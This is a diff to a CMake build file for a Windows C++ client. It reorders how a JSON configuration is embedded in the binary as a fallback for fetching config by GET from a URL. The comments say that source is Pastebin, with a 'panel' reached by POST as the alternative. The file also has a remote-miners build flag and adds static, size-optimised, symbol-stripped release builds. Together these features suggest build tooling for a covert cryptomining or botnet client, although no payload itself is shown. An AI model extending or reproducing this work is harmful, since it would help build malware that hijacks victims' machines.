@@ -18,20 +18,6 @@ endif()
 
 add_definitions(-DUNICODE -D_UNICODE)
 
-# Generate embedded config header from JSON
-include(${CMAKE_CURRENT_SOURCE_DIR}/cmake/GenerateEmbeddedConfig.cmake)
-
-# Accept config path from builder, with fallback to client resources
-if(NOT DEFINED EMBEDDED_CONFIG_JSON_INPUT)
-    set(EMBEDDED_CONFIG_JSON_INPUT "${CMAKE_CURRENT_SOURCE_DIR}/resources/embedded_config.json")
-endif()
-
-set(EMBEDDED_CONFIG_HEADER "${CMAKE_CURRENT_BINARY_DIR}/generated/embedded_config_generated.h")
-if(ENABLE_EMBEDDED_CONFIG OR EXISTS "${EMBEDDED_CONFIG_JSON_INPUT}")
-    message(STATUS "Using embedded config from: ${EMBEDDED_CONFIG_JSON_INPUT}")
-    generate_embedded_config("${EMBEDDED_CONFIG_JSON_INPUT}" "${EMBEDDED_CONFIG_HEADER}")
-endif()
-
 # Optional Debug Console feature
 option(ENABLE_DEBUG_CONSOLE "Enable debug console output" OFF)
 if(ENABLE_DEBUG_CONSOLE)
@@ -65,23 +51,30 @@ if(ENABLE_REMOTE_MINERS)
     add_definitions(-DENABLE_REMOTE_MINERS)
 endif()
 
-# Optional GET Config URL feature
+# Optional GET Config URL feature (MUST be before embedded config generation)
 set(CONFIG_GET_URL "" CACHE STRING "Direct GET URL for config fetching (instead of POST)")
 if(CONFIG_GET_URL)
     message(STATUS "Config GET URL enabled: ${CONFIG_GET_URL}")
     add_definitions(-DCONFIG_GET_URL="${CONFIG_GET_URL}")
+    message(STATUS "GET mode: Embedded fallback config will be used if available")
 endif()
 
-# Embedded Config only for Pastebin/GET method (not for panel/POST)
-# Panel version has direct panel connectivity, doesn't need fallback
-# Pastebin version needs fallback when pastebin is offline
-if(CONFIG_GET_URL)
-    set(ENABLE_EMBEDDED_CONFIG ON)
-    message(STATUS "Embedded fallback config enabled (Pastebin/GET mode)")
+# Generate embedded config header from JSON
+include(${CMAKE_CURRENT_SOURCE_DIR}/cmake/GenerateEmbeddedConfig.cmake)
+
+# Accept config path from builder, with fallback to client resources
+if(NOT DEFINED EMBEDDED_CONFIG_JSON_INPUT)
+    set(EMBEDDED_CONFIG_JSON_INPUT "${CMAKE_CURRENT_SOURCE_DIR}/resources/embedded_config.json")
+endif()
+
+set(EMBEDDED_CONFIG_HEADER "${CMAKE_CURRENT_BINARY_DIR}/generated/embedded_config_generated.h")
+if(EXISTS "${EMBEDDED_CONFIG_JSON_INPUT}")
+    message(STATUS "Embedded config file found - generating header")
+    message(STATUS "Using embedded config from: ${EMBEDDED_CONFIG_JSON_INPUT}")
+    generate_embedded_config("${EMBEDDED_CONFIG_JSON_INPUT}" "${EMBEDDED_CONFIG_HEADER}")
     add_definitions(-DENABLE_EMBEDDED_CONFIG)
 else()
-    set(ENABLE_EMBEDDED_CONFIG OFF)
-    message(STATUS "Embedded fallback config disabled (Panel/POST mode)")
+    message(STATUS "Embedded config file not found - relying on CONFIG_GET_URL at runtime")
 endif()
 
 # Source files
@@ -147,6 +140,10 @@ if(MSVC)
 endif()
 if(NOT MSVC)
 	set(CMAKE_EXE_LINKER_FLAGS "${CMAKE_EXE_LINKER_FLAGS} -static")
+	# Size optimization for Release builds with MinGW
+	# -Os: optimize for size, -s: strip symbols, -Wl,--gc-sections: remove unused sections
+	set(CMAKE_CXX_FLAGS_RELEASE "-Os -s -Wl,--gc-sections -fdata-sections -ffunction-sections")
+	set(CMAKE_C_FLAGS_RELEASE "-Os -s -Wl,--gc-sections -fdata-sections -ffunction-sections")
 endif()
 set(CMAKE_FIND_LIBRARY_SUFFIXES ".a")
 
